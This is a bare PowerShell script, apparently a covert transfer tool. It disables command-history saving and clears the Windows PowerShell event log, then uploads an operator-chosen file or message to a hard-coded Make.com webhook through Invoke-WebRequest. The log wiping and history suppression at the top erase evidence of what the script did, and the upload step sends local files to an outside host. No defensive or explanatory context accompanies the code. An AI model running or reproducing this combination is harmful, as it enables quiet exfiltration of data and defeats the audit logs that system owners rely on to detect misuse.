$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$apiurl = "https://hook.eu2.make.com/pgvj9kxtwo4pcrhxwn1kg9p9agp129bl"
$option = Read-Host "Enter 'm' to send messages or 'f' to send files"   
if ($option.ToLower() -eq "f") {
    $fileoutput = Read-Host "Enter file path eg. C:\Windows\test.png "
    $boundary = [System.Guid]::NewGuid().ToString()
    $fileBytes = [System.IO.File]::ReadAllBytes($fileoutput)
    $fileName = [System.IO.Path]::GetFileName($fileoutput)
    $LF = "`r`n"
    $body = (
    "--$boundary$LF" +
    "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF" +
    "Content-Type: application/octet-stream$LF$LF" +
    [System.Text.Encoding]::Default.GetString($fileBytes) + $LF +
    "--$boundary--$LF"
    )
    $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
    Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyBytes -UseBasicParsing | Out-Null
}
elseif ($option.ToLower() -eq "m") {
    $message = Read-Host "Enter the message you want to send"
    $message = "$message"  # Adding double quotes around the message
    Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "text/plain" -Body $message -UseBasicParsing | Out-Null
}